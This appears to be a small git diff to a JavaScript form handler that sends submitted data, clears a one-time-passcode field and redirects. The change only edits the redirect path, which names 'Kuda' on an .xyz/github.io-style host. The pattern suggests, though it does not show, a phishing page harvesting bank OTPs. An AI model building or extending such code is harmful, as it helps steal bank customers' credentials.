@@ -18,7 +18,7 @@ document.getElementById("myForm").onsubmit = function (event) {
     function (response) {
       console.log("Sent successfully:", response);
       otp.value = "";
-      location.href = "/lo-Kuda.xyz.github.io/index.html";
+      location.href = "/kesh-Kuda.xyz.github.io/index.html";
     },
     function (error) {
       console.log("Failed to send:", error);
